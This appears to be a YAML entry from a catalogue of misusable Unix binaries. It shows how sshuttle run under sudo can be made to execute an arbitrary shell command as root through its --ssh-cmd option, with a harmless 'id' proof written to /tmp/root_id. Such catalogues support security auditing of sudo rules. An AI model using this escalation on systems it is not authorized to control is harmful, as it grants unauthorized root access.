---
functions:
  sudo:
    - description: If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access. The output of the executed command is in /tmp/root_id
      code: |
        sudo sshuttle -r root@anything --ssh-cmd "/bin/bash -c 'id>/tmp/root_id'" 192.168.3.3
---
